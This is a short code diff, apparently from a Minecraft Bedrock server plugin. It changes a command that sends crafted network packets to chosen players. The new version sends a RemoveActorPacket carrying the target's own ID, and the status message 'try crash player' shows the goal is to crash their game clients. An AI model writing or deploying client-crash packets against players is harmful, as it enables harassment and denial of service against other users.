@@ -1,5 +1,6 @@
 #include "Command.h"
 #include "Utils/Utils.h"
+#include "mc/network/packet/RemoveActorPacket.h"
 
 namespace tls::command {
 
@@ -88,9 +89,8 @@ void registerCommand() {
             auto item = param.player.results(origin).data;
             for (Player* target : *item) {
                 if (target) {
-                    string           name = target->getRealName();
-                    LevelChunkPacket pkt  = LevelChunkPacket();
-                    pkt.mCacheEnabled     = true;
+                    string            name = target->getRealName();
+                    RemoveActorPacket pkt  = RemoveActorPacket(target->getAgentID());
                     target->sendNetworkPacket(pkt);
                     tls::utils::sendMsg(player, "try crash player: {}"_tr(name));
                 }
